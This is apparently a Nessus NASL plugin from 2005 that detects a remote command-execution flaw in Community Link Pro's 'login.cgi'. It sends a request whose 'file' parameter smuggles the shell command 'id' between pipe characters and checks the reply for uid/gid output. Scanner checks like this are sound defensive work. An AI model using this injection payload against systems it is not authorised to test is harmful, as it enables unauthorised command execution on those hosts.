#
#  This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
#  Ref: BADROOT SECURITY GROUP - mozako
#
#  This script is released under the GNU GPL v2
#

 desc["english"] = "
The remote host is running Community Link Pro, a web-based application written
in Perl.

The remote version of this software contains a flaw in the script 'login.cgi'
which may allow an attacker to execute arbitrary commands on the remote host.

Solution : Disable or remove this CGI
Risk factor : High";


if(description)
{
 script_id(19305);
 script_bugtraq_id(14097);
 script_version ("$Revision: 1.1 $");
 name["english"] = "Community Link Pro webeditor login.cgi remote command execution";
 script_name(english:name["english"]);
 

 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for Community Link Pro webeditor login.cgi remote execution flaw";
 
 script_summary(english:summary["english"]);
 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 2005 David Maciejak");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);



http_check_remote_code (
                        check_request:"/login.cgi?username=&command=simple&do=edit&password=&file=|id|",
                        check_result:"uid=[0-9]+.*gid=[0-9]+.*",
                        command:"id",
                        description:desc["english"],
			extra_dirs:make_list("/app/webeditor")
                        );

